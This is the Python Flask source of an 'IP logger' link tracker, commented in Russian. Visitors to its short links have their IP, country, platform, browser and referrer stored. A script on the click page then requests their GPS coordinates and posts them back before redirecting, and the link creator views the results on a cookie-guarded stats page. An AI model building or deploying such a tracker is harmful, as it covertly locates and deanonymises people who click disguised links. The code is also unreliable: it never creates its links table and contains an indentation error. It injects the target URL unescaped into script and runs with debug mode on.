from flask import Flask, render_template, request, redirect, url_for, make_response
import sqlite3
import uuid
from datetime import datetime
import csv
import io
from functools import wraps

app = Flask(__name__)
app.config['DATABASE'] = 'iplogger.db'
app.config['SECRET_KEY'] = '647673t37647364'

# Декоратор для защиты статистики
def require_cookie(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        link_id = kwargs.get('link_id')
        if request.cookies.get(f'access_{link_id}') != 'true':
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

def init_db():
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS logs 
                    (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     link_id TEXT NOT NULL,
                     ip TEXT,
                     country TEXT,
                     platform TEXT,
                     browser TEXT,
                     referrer TEXT,
                     latitude REAL,  # Добавлено
                     longitude REAL, # Добавлено
                     timestamp DATETIME)''')

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create', methods=['POST'])
def create_link():
    link_id = str(uuid.uuid4())[:8]
    target_url = request.form.get('target_url', 'https://google.com')
    created_at = datetime.now()
    
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute("INSERT INTO links (id, created_at, target_url) VALUES (?, ?, ?)", 
                 (link_id, created_at, target_url))
        conn.commit()
    
    resp = make_response(redirect(url_for('stats', link_id=link_id)))
    resp.set_cookie(f'access_{link_id}', 'true', max_age=60*60*24*365)
    return resp

@app.route('/<link_id>', methods=['GET', 'POST'])
def track(link_id):
    # Получаем целевой URL ДО любого кода
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute("SELECT target_url FROM links WHERE id = ?", (link_id,))
        target = c.fetchone()

    if request.method == 'POST':
        # Обработка данных геолокации
        data = request.json
        with sqlite3.connect(app.config['DATABASE']) as conn:
            c = conn.cursor()
            c.execute('''UPDATE logs SET 
                      latitude = ?, 
                      longitude = ?
                      WHERE id = ?''',
                    (data['lat'], data['lon'], data['log_id']))
            conn.commit()
        return 'OK'
    
    # Оригинальный код сбора данных
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.referrer
    timestamp = datetime.now()
    
    # Парсим User-Agent
    platform = 'Unknown'
    browser = 'Unknown'
    if 'Windows' in user_agent:
        platform = 'Windows'
    elif 'Linux' in user_agent:
        platform = 'Linux'
    elif 'Mac' in user_agent:
        platform = 'MacOS'
    elif 'iPhone' in user_agent:
        platform = 'iPhone'
    elif 'Android' in user_agent:
        platform = 'Android'

    if 'Chrome' in user_agent:
        browser = 'Chrome'
    elif 'Firefox' in user_agent:
        browser = 'Firefox'
    elif 'Safari' in user_agent:
        browser = 'Safari'
    elif 'Edge' in user_agent:
        browser = 'Edge'
    elif 'Opera' in user_agent:
        browser = 'Opera'
    
    # Определяем страну по IP (базовое определение)
    country = 'Unknown'
    try:
        from ip2geotools.databases.noncommercial import DbIpCity
        res = DbIpCity.get(ip, api_key='free')
        country = res.country
    except:
        pass
    
    # Сохраняем базовую запись
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO logs 
                  (link_id, ip, country, platform, browser, referrer, timestamp)
                  VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (link_id, ip, country, platform, browser, referrer, timestamp))
        log_id = c.lastrowid
        conn.commit()
    
    # Перенаправление + отправка HTML с запросом геолокации
     return f'''
    <!DOCTYPE html>
    <html>
    <body>
    <script>
    function getLocation() {{
        // Исправленная строка:
        const redirectUrl = "{target[0] if target else 'https://google.com'}/";

        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                function(position) {{
                    fetch(window.location.href, {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            log_id: {log_id}
                        }})
                    }}).then((res) => {
                            console.log(res);
                            console.log(redirectUrl);
                            console.log(window.location);
                            return window.location = redirectUrl
                        });
                }},
                function(error) {{
                    window.location = redirectUrl;
                }}
            );
        }} else {{
            window.location = redirectUrl;
        }}
    }}
    getLocation();
    </script>
    </body>
    </html>
    '''

@app.route('/stats/<link_id>')
@require_cookie
def stats(link_id):
    tracking_url = f"{request.host_url}{link_id}"  # Добавлено

    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        
        # Получаем общую статистику
        c.execute('''SELECT 
                    COUNT(*) as total_clicks,
                    COUNT(DISTINCT ip) as unique_visitors,
                    country,
                    platform,
                    browser
                 FROM logs 
                 WHERE link_id = ?
                 GROUP BY country, platform, browser
                 ORDER BY total_clicks DESC''', (link_id,))
        
        stats = c.fetchall()
        
        # Получаем последние 50 записей
        c.execute('''SELECT * FROM logs 
                  WHERE link_id = ?
                  ORDER BY timestamp DESC
                  LIMIT 50''', (link_id,))
        logs = c.fetchall()
    
    return render_template('stats.html', 
                         stats=stats,
                         logs=logs,
                         link_id=link_id,
                         tracking_url=tracking_url)  # Добавлено



if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
